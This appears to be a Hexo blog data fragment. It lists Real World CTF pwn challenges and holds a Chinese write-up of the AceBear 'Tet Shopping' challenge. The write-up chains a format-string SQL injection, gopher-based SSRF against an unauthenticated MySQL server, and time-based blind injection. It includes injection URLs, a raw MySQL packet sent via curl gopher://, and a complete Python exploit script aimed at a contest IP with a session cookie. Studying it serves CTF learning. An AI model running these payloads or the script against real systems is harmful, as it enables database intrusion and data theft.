class=\"line\"></span><br><span class=\"line\">Downloads: https://s3-us-west-1.amazonaws.com/realworldctf/state-of-the-art_vm_ddde3799c4dc2936eb182ec3dbefdfef.zip</span><br><span class=\"line\"></span><br><span class=\"line\">nc 34.236.229.208 31338</span><br><span class=\"line\"></span><br><span class=\"line\">Hint: Check start.sh</span><br></pre></td></tr></table></figure>\n<h3 id=\"Spectre-Free\"><a href=\"#Spectre-Free\" class=\"headerlink\" title=\"Spectre-Free\"></a>Spectre-Free</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn</span><br><span class=\"line\"></span><br><span class=\"line\">The spectre&apos;s paper told me that the vulnerability can only be used to achieve information discloure, while I don&apos;t care about infoleak. Why not use it to exchange superior performance?</span><br><span class=\"line\"></span><br><span class=\"line\">Downloads: https://s3-us-west-1.amazonaws.com/realworldctf/togiveout.tgz.b5b489f104f50d9c5342ccf7180add5c</span><br><span class=\"line\"></span><br><span class=\"line\">http://34.236.229.208</span><br><span class=\"line\"></span><br><span class=\"line\">Hint: If you are not a master of Spectre, maybe you can use some unpatched 1day bug.</span><br><span class=\"line\"></span><br><span class=\"line\">Hint 2: The spectre&apos;s patch happens to make certain bugs unable to be triggered. Hence Microsoft is lazy, so they may not even analyze or patch those bugs. Try to retrieve some unpatched 1 day bugs please.Also I found a tweet which may be related to this.</span><br></pre></td></tr></table></figure>\n<h3 id=\"kid-vm\"><a href=\"#kid-vm\" class=\"headerlink\" title=\"kid vm\"></a>kid vm</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn Writing a vm is the best way to teach kids to learn vm escape.</span><br><span class=\"line\"></span><br><span class=\"line\">Downloads: https://s3-us-west-1.amazonaws.com/realworldctf/kid_vm_801180ca894848965a2d6424472e0acb.zip</span><br><span class=\"line\"></span><br><span class=\"line\">nc 34.236.229.208 9999</span><br></pre></td></tr></table></figure>\n<h3 id=\"p90-RUSH-B\"><a href=\"#p90-RUSH-B\" class=\"headerlink\" title=\"p90  RUSH B\"></a>p90  RUSH B</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn</span><br><span class=\"line\"></span><br><span class=\"line\">When Cloud9 won the Major at Boston in 2018, another war starts off the cyberspace. The CTF players who enthuse about CS:GO not only want to run inside the Dust2 but also &quot;&quot;run&quot;&quot; outside the map. There is a challenge for guys who don&apos;t wanna be stuck in jail. Have fun with the Counter-Strike :)</span><br><span class=\"line\"></span><br><span class=\"line\">Here is a readme for you https://www.dropbox.com/s/3nn5pwukg5mk6k6/readme.md?dl=0</span><br><span class=\"line\"></span><br><span class=\"line\">A CS:GO server template: https://www.dropbox.com/s/7v48wdctx83d1lw/CSGO_Server_5ea3610faacd5b3bae1e97e33927caaf.zip?dl=0</span><br></pre></td></tr></table></figure>\n<h3 id=\"untrustworthy\"><a href=\"#untrustworthy\" class=\"headerlink\" title=\"untrustworthy\"></a>untrustworthy</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn</span><br><span class=\"line\"></span><br><span class=\"line\">Don&apos;t trust everything you see. There are secrets hidden in plain sight.</span><br><span class=\"line\"></span><br><span class=\"line\">nc 18.211.57.236 13337</span><br><span class=\"line\"></span><br><span class=\"line\">https://s3-us-west-1.amazonaws.com/realworldctf/distrib.zip</span><br></pre></td></tr></table></figure>\n"},{"title":"ssrf+gopher","date":"2018-06-30T01:52:45.000Z","_content":"\n## AceBear Security  Contest-Tet Shopping\n\n### 漏洞说明\n\n* 格式化字符串sql注入\n* 基于gopher协议的SSRF攻击完成对mysql未授权漏洞的利用\n* 时间盲注\n\n### 题目\n\n#### 格式化字符串注入忽略\n\n漏洞代码:\n\ninfo.php\n\n```\nuid = (int)$_SESSION[\"id\"];\n$prepare_qr = $jdb->addParameter(\"SELECT user from users where uid=%s\", $uid);\n$result1 = $jdb->fetch_assoc($prepare_qr);\n$username = $result1[0]['user'];\n\n$prepare_qr = $jdb->addParameter(\"SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s\",  $_GET['uid']);\n$prepare_qr = $jdb->addParameter($prepare_qr.' and user=%s', $username);\n```\n\n这里使用了两次addParameter方法，每次调用该方法，都会执行一次vsprintf方法。\n\naddParamter方法:\n\n```\nfunction addParameter($qr, $args){\n\t\tif(is_null($qr)){\n\t\t\treturn;\n\t\t}\n\t\tif(strpos($qr, '%') === false ) {\n\t\t\treturn;\n\t\t}\n\t\t$args = func_get_args();\n\t\tarray_shift($args);\n\t\tif(is_array($args[0]) && count($args)==1){\n\t\t\t$args = $args[0];\n\t\t}\n\t\tforeach($args as $arg){\n\t\t\tif(!is_scalar($arg) && !is_null($arg)){\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\t$qr = str_replace( \"'%s'\", '%s', $qr); \n\t\t$qr = str_replace( '\"%s\"', '%s', $qr); \n\t\t$qr = preg_replace( '|(?<!%)%f|' , '%F', $qr);\n\t\t$qr = preg_replace( '|(?<!%)%s|', \"'%s'\", $qr); \n\t\t\n\t\tarray_walk($args, array( $this, 'ebr' ) );\n\t\treturn @vsprintf($qr, $args);\n\t}\n```\n\n测试代码:\n\n```\n<?php\n    include 'cfg.php';\n    # uid = %1$' or 1=1%23\n    # \n    # username = ht\n    $username=$_GET['username'];\n    $prepare_qr = $jdb->addParameter(\"SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s\",  $_GET['uid']);\n    print_r(\"First:<br>\");\n    print_r($prepare_qr.'<br>');\n\n    $prepare_qr = $jdb->addParameter($prepare_qr.' and user=%s', $username);\n    print_r(\"Second:<br>\");\n    print_r($prepare_qr);\n```\n\npayload1:\n\n> http://127.0.0.1/acbear/test_ssql.php?uid=%1\\$' or 1=1%23&username=ht\n\n结果:\n\n```\nFirst:\nSELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='%1$\\' or 1=1#'\nSecond:\nSELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='' or 1=1#' and user='ht'\n```\n\npayload2:\n\n> http://127.0.0.1/acbear/test_ssql.php?uid=%1$c or 1=1%23&username=39\n\n结果:\n\n```\nFirst:\nSELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='%1$c or 1=1#'\nSecond:\nSELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='' or 1=1#' and user='39'\n```\n\n#### ssrf+gopher\n\n1. 本地测试gopher协议\n\n   抓包得到如下数据:\n\n   ASCII:\n\n   ```\n   ............!.......................root..mysql_native_password.d._os.Linux._client_name.libmysql._pid.372._client_version.5.7.22\t_platform.x86_64.program_name.mysql!....select @@version_comment limit 1.....SELECT DATABASE().....flag.....show databases.....show tables.....flag......goods......info......users......select * from flag.....\n   ```\n\n   原始数据:\n\n   ```\n   a100000185a6ff0100000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033337320f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c\n   210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031\n   120000000353454c4543542044415441424153452829\n   0500000002666c6167\n   0f0000000373686f7720646174616261736573\n   0c0000000373686f77207461626c6573\n   0600000004666c616700\n   0700000004676f6f647300\n   0600000004696e666f00\n   0700000004757365727300\n   130000000373656c656374202a2066726f6d20666c6167\n   0100000001\n   ```\n\n   将上边的数据合为一行，并使用url编码。\n\n   ```\n   %a1%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%33%37%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%05%00%00%00%02%66%6c%61%67%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%07%00%00%00%04%67%6f%6f%64%73%00%06%00%00%00%04%69%6e%66%6f%00%07%00%00%00%04%75%73%65%72%73%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01\n   ```\n\n   使用gopher协议发送数据。\n\n   ```\n   curl gopher://127.0.0.1:3306/_%a1%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%33%37%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%05%00%00%00%02%66%6c%61%67%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%07%00%00%00%04%67%6f%6f%64%73%00%06%00%00%00%04%69%6e%66%6f%00%07%00%00%00%04%75%73%65%72%73%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01\n   ```\n\n   得到结果:\n\n   ```\n   J\n   f☻ §          3cPWM7S♀9^' mysql_native_password   ☻   ☻   ☺  ☺☺'  ☻♥def   ◄@@version_comment ♀! T     ▼  ↔  ♥∟MySQL Community Server (GPL)  ♦  ☻   ☺  ☺☺   ☻♥def\n   DATABASE() ♀! f     ▼  ☺  ♥  ♦  ☻   ►  ☺   ☻@   ☺♣♦flag☺  ☺☺K  ☻♥def↕information_schemSCHEMATSCHEMATDatabase♂SCHEMA_NAM♀!    ☺    ‼  ♥↕information_schema♦  ♦♥app         bd_study♣  ♠♦blog♂\n   challenges♠ ♣crawl♦     ♥ctf\n   graduate_hnis♠  ☼♣hetaomwjs♣\n     ►     homestead♠  ◄♣jewe  ↕jiansh  ‼mybatis♠  ¶♣mysql   netclass♠  ■♣nuomi♦  ↨♥o2o‼  ↑↕performance_schema       securixiaomi2chinaz  $♠ydjxpt\"  %!yolanda_information_collection_02♠  &♣yshop♠  '♣zhihu  (  \"   ☺  ☺☺V  ☻♥def↕information_schema♂TABLE_NAMES♂TABLE_NAMES♫Tables_in_flag\n   TABLE_NAME♀!    ☺    ♣  ♥♦flag♠  ♦♣goods♣  ♣♦info♠  ♠♣users    \"   +  ☺♥def♦flag♦flag♦flag♦flag♦flag♀! ♂         ☻  ☻\n   ,  ☺♥def♦flag♣goods♣goods♥uid♥uid♀? ♂   ♥♥B   ☺0-  ☻♥def♦flag♣goods♣goods♦name♦name♀!    ♣P    ;  ♥♥def♦flag♣goods♣good♂description♂description♀! X☻  ☺►    +  ♦♥def♦flag♣goods♣goods♥img♥img♀! X☻  ☺►      ♣  ☻   (  ☺♥def♦flag♦info♦info☻id☻i♀? ♂   ♥♥B   ☺0+  ☻♥def♦flag♦info♦info♦user♦user♀! ,☺  ☺►    *  ♥♥def♦flag♦info♦info♥gid♥gid♀? ♂   ♥☺►   ☺0  ♦  ☻   ,  ☺♥def♦flag♣users♣users♥uid♥uid♀? ♂   ♥♥B   ☺0-  ☻♥def♦flag♣users♣users♦user♦user♀!    ♣P    1  ♥♥def♦flag♣users♣users♠passwd♠passwd♀!    ☺►      ♦  ☻   ☺  ☺☺*  ☻♥def♦flag♦flag♦flag♦flag♦flag♀! ♂          ♥▼CTF{SSRF_GOPHER_CAN_YOU_GOT_IT}  ♦\n   ```\n\n   虽然有些乱码，我们可以看到，查询的flag出现了。\t\n\n2. 修改sql语句。\n\n   > 130000000373656c656374202a2066726f6d20666c6167\n\n   原始数据中，改行即对应着sql语句，结构如下:\n\n   > hex(sql语句长度加1) + 固定字段(00000003 ) + sql语句16进制编码\n\n   修改该行，即可获得执行对应的sql语句。\n\n### 利用脚本\n\n```python\nimport binascii\nimport requests\ndef str_hex(data):\n    return str(hex(data)).replace('0x','')\ndef encode(query):\n    enc_query = ''\n    for i in query:\n        enc_query += str_hex(ord(i))\n    return enc_query\n\ndef gen_payload(query):\n    payload = 'a100000185a6ff0100000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033337320f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031120000000353454c45435420444154414241534528290500000002666c61670f0000000373686f77206461746162617365730c0000000373686f77207461626c65730600000004666c6167000700000004676f6f6473000600000004696e666f000700000004757365727300'\n    payload += str_hex(len(query)+1)\n    payload += '00000003'\n    payload += encode(query)\n    payload += '0100000001'\n    return payload\n\ndef result(payload):\n    result = [payload[i:i+2] for i in range(0,len(payload),2)]\n    return binascii.b2a_hex(b\"gopher://127.0.0.1:3306/_%\"+\"%\".join(result))\n\ndef exp():\n    i = 1\n    flag = \"\"\n    url = \"http://128.199.179.156/info.php\"\n    cookie = {\n        'PHPSESSID':'av7963h17c1qukv4jm4gklvoi1'\n    }\n    while True:\n        for j in range(127,32,-1):\n            print 'j:'+str(j)\n            query = \"select * from flag.flag where IF(ascii(substr((select * from flag.flag),%s,1)) =%s,sleep(5),1);\" % (str(i),str(j))\n            uid = \"?uid=%1$'%20union%20select%201,1,0x\" + result(gen_payload(query)) + \"%23\"\n            fullurl = url + uid\n            try:\n                r = requests.get(fullurl,cookies=cookie,timeout=5)\n            except Exception as e:\n                flag += chr(j)\n                print(flag)\n                i = i+1\n                break\n    print(flag)\n\nif __name__ == '__main__':\n    exp()\n```\n\n","source":"_posts/ssrf-gopher.md","raw":"---\ntitle: ssrf+gopher\ndate: 2018-06-30 09:52:45\ntags:\n---\n\n## AceBear Security  Contest-Tet Shopping\n\n### 漏洞说明\n\n* 格式化字符串sql注入\n* 基于gopher协议的SSRF攻击完成对mysql未授权漏洞的利用\n* 时间盲注\n\n### 题目\n\n#### 格式化字符串注入忽略\n\n漏洞代码:\n\ninfo.php\n\n```\nuid = (int)$_SESSION[\"id\"];\n$prepare_qr = $jdb->addParameter(\"SELECT user from users where uid=%s\", $uid);\n$result1 = $jdb->fetch_assoc($prepare_qr);\n$username = $result1[0]['user'];\n\n$prepare_qr = $jdb->addParameter(\"SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s\",  $_GET['uid']);\n$prepare_qr = $jdb->addParameter($prepare_qr.' and user=%s', $username);\n```\n\n这里使用了两次addParameter方法，每次调用该方法，都会执行一次vsprintf方法。\n\naddParamter方法:\n\n```\nfunction addParameter($qr, $args){\n\t\tif(is_null($qr)){\n\t\t\treturn;\n\t\t}\n\t\tif(strpos($qr, '%') === false ) {\n\t\t\treturn;\n\t\t}\n\t\t$args = func_get_args();\n\t\tarray_shift($args);\n\t\tif(is_array($args[0]) && count($args)==1){\n\t\t\t$args = $args[0];\n\t\t}\n\t\tforeach($args as $arg){\n\t\t\tif(!is_scalar($arg) && !is_null($arg)){\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\t$qr = str_replace( \"'%s'\", '%s', $qr); \n\t\t$qr = str_replace( '\"%s\"', '%s', $qr); \n\t\t$qr = preg_replace( '|(?<!%)%f|' , '%F', $qr);\n\t\t$qr = preg_replace( '|(?<!%)%s|', \"'%s'\", $qr); \n\t\t\n\t\tarray_walk($args, array( $this, 'ebr' ) );\n\t\treturn @vsprintf($qr, $args);\n\t}\n```\n\n测试代码:\n\n```\n<?php\n    include 'cfg.php';\n    # uid = %1$' or 1=1%23\n    # \n    # username = ht\n    $username=$_GET['username'];\n    $prepare_qr = $jdb->addParameter(\"SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s\",  $_GET['uid']);\n    print_r(\"First:<br>\");\n    print_r($prepare_qr.'<br>');\n\n    $prepare_qr = $jdb->addParameter($prepare_qr.' and user=%s', $username);\n    print_r(\"Second:<br>\");\n    print_r($prepare_qr);\n```\n\npayload1:\n\n> http://127.0.0.1/acbear/test_ssql.php?uid=%1\\$' or 1=1%23&username=ht\n\n结果:\n\n```\nFirst:\nSELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='%1$\\' or 1=1#'\nSecond:\nSELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='' or 1=1#' and user='ht'\n```\n\npayload2:\n\n> http://127.0.0.1/acbear/test_ssql.php?uid=%1$c or 1=1%23&username=39\n\n结果:\n\n```\nFirst:\nSELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='%1$c or 1=1#'\nSecond:\nSELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='' or 1=1#' and user='39'\n```\n\n#### ssrf+gopher\n\n1. 本地测试gopher协议\n\n   抓包得到如下数据:\n\n   ASCII:\n\n   ```\n   ............!.......................root..mysql_native_password.d._os.Linux._client_name.libmysql._pid.372._client_version.5.7.22\t_platform.x86_64.program_name.mysql!....select @@version_comment limit 1.....SELECT DATABASE().....flag.....show databases.....show tables.....flag......goods......info......users......select * from flag.....\n   ```\n\n   原始数据:\n\n   ```\n   a100000185a6ff0100000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033337320f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c\n   210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031\n   120000000353454c4543542044415441424153452829\n   0500000002666c6167\n   0f0000000373686f7720646174616261736573\n   0c0000000373686f77207461626c6573\n   0600000004666c616700\n   0700000004676f6f647300\n   0600000004696e666f00\n   0700000004757365727300\n   130000000373656c656374202a2066726f6d20666c6167\n   0100000001\n   ```\n\n   将上边的数据合为一行，并使用url编码。\n\n   ```\n   %a1%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%33%37%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%05%00%00%00%02%66%6c%61%67%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%07%00%00%00%04%67%6f%6f%64%73%00%06%00%00%00%04%69%6e%66%6f%00%07%00%00%00%04%75%73%65%72%73%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01\n   ```\n\n   使用gopher协议发送数据。\n\n   ```\n   curl gopher://127.0.0.1:3306/_%a1%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%33%37%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%05%00%00%00%02%66%6c%61%67%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%07%00%00%00%04%67%6f%6f%64%73%00%06%00%00%00%04%69%6e%66%6f%00%07%00%00%00%04%75%73%65%72%73%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01\n   ```\n\n   得到结果:\n\n   ```\n   J\n   f☻ §          3cPWM7S♀9^' mysql_native_password   ☻   ☻   ☺  ☺☺'  ☻♥def   ◄@@version_comment ♀! T     ▼  ↔  ♥∟MySQL Community Server (GPL)  ♦  ☻   ☺  ☺☺   ☻♥def\n   DATABASE() ♀! f     ▼  ☺  ♥  ♦  ☻   ►  ☺   ☻@   ☺♣♦flag☺  ☺☺K  ☻♥def↕information_schemSCHEMATSCHEMATDatabase♂SCHEMA_NAM♀!    ☺    ‼  ♥↕information_schema♦  ♦♥app         bd_study♣  ♠♦blog♂\n   challenges♠ ♣crawl♦     ♥ctf\n   graduate_hnis♠  ☼♣hetaomwjs♣\n     ►     homestead♠  ◄♣jewe  ↕jiansh  ‼mybatis♠  ¶♣mysql   netclass♠  ■♣nuomi♦  ↨♥o2o‼  ↑↕performance_schema       securixiaomi2chinaz  $♠ydjxpt\"  %!yolanda_information_collection_02♠  &♣yshop♠  '♣zhihu  (  \"   ☺  ☺☺V  ☻♥def↕information_schema♂TABLE_NAMES♂TABLE_NAMES♫Tables_in_flag\n   TABLE_NAME♀!    ☺    ♣  ♥♦flag♠  ♦♣goods♣  ♣♦info♠  ♠♣users    \"   +  ☺♥def♦flag♦flag♦flag♦flag♦flag♀! ♂         ☻  ☻\n   ,  ☺♥def♦flag♣goods♣goods♥uid♥uid♀? ♂   ♥♥B   ☺0-  ☻♥def♦flag♣goods♣goods♦name♦name♀!    ♣P    ;  ♥♥def♦flag♣goods♣good♂description♂description♀! X☻  ☺►    +  ♦♥def♦flag♣goods♣goods♥img♥img♀! X☻  ☺►      ♣  ☻   (  ☺♥def♦flag♦info♦info☻id☻i♀? ♂   ♥♥B   ☺0+  ☻♥def♦flag♦info♦info♦user♦user♀! ,☺  ☺►    *  ♥♥def♦flag♦info♦info♥gid♥gid♀? ♂   ♥☺►   ☺0  ♦  ☻   ,  ☺♥def♦flag♣users♣users♥uid♥uid♀? ♂   ♥♥B   ☺0-  ☻♥def♦flag♣users♣users♦user♦user♀!    ♣P    1  ♥♥def♦flag♣users♣users♠passwd♠passwd♀!    ☺►      ♦  ☻   ☺  ☺☺*  ☻♥def♦flag♦flag♦flag♦flag♦flag♀! ♂          ♥▼CTF{SSRF_GOPHER_CAN_YOU_GOT_IT}  ♦\n   ```\n\n   虽然有些乱码，我们可以看到，查询的flag出现了。\t\n\n2. 修改sql语句。\n\n   > 130000000373656c656374202a2066726f6d20666c6167\n\n   原始数据中，改行即对应着sql语句，结构如下:\n\n   > hex(sql语句长度加1) + 固定字段(00000003 ) + sql语句16进制编码\n\n   修改该行，即可获得执行对应的sql语句。\n\n### 利用脚本\n\n```python\nimport binascii\nimport requests\ndef str_hex(data):\n    return str(hex(data)).replace('0x','')\ndef encode(query):\n    enc_query = ''\n    for i in query:\n        enc_query += str_hex(ord(i))\n    return enc_query\n\ndef gen_payload(query):\n    payload = 'a100000185a6ff0100000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033337320f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031120000000353454c45435420444154414241534528290500000002666c61670f0000000373686f77206461746162617365730c0000000373686f77207461626c65730600000004666c6167000700000004676f6f6473000600000004696e666f000700000004757365727300'\n    payload += str_hex(len(query)+1)\n    payload += '00000003'\n    payload += encode(query)\n    payload += '0100000001'\n    return payload\n\ndef result(payload):\n    result = [payload[i:i+2] for i in range(0,len(payload),2)]\n    return binascii.b2a_hex(b\"gopher://127.0.0.1:3306/_%\"+\"%\".join(result))\n\ndef exp():\n    i = 1\n    flag = \"\"\n    url = \"http://128.199.179.156/info.php\"\n    cookie = {\n        'PHPSESSID':'av7963h17c1qukv4jm4gklvoi1'\n    }\n    while True:\n        for j in range(127,32,-1):\n            print 'j:'+str(j)\n            query = \"select * from flag.flag where IF(ascii(substr((select * from flag.flag),%s,1)) =%s,sleep(5),1);\" % (str(i),str(j))\n            uid = \"?uid=%1$'%20union%20select%201,1,0x\" + result(gen_payload(query)) + \"%23\"\n            fullurl = url + uid\n            try:\n                r = requests.get(fullurl,cookies=cookie,timeout=5)\n            except Exception as e:\n                flag += chr(j)\n                print(flag)\n                i = i+1\n                break\n    print(flag)\n\nif __name__ == '__main__':\n    exp()\n```\n\n","slug":"ssrf-gopher","published":1,"updated":"2018-06-30T10:57:10.811Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12ij001pqkdldyql0rwd","content":"<h2 id=\"AceBear-Security-Contest-Tet-Shopping\"><a href=\"#AceBear-Security-Contest-Tet-Shopping\" class=\"headerlink\" title=\"AceBear Security  Contest-Tet Shopping\"></a>AceBear Security  Contest-Tet Shopping</h2><h3 id=\"漏洞说明\"><a href=\"#漏洞说明\" class=\"headerlink\" title=\"漏洞说明\"></a>漏洞说明</h3><ul>\n<li>格式化字符串sql注入</li>\n<li>基于gopher协议的SSRF攻击完成对mysql未授权漏洞的利用</li>\n<li>时间盲注</li>\n</ul>\n<h3 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h3><h4 id=\"格式化字符串注入忽略\"><a href=\"#格式化字符串注入忽略\" class=\"headerlink\" title=\"格式化字符串注入忽略\"></a>格式化字符串注入忽略</h4><p>漏洞代码:</p>\n<p>info.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uid = (int)$_SESSION[&quot;id&quot;];</span><br><span class=\"line\">$prepare_qr = $jdb-&gt;addParameter(&quot;SELECT user from users where uid=%s&quot;, $uid);</span><br><span class=\"line\">$result1 = $jdb-&gt;fetch_assoc($prepare_qr);</span><br><span class=\"line\">$username = $result1[0][&apos;user&apos;];</span><br><span 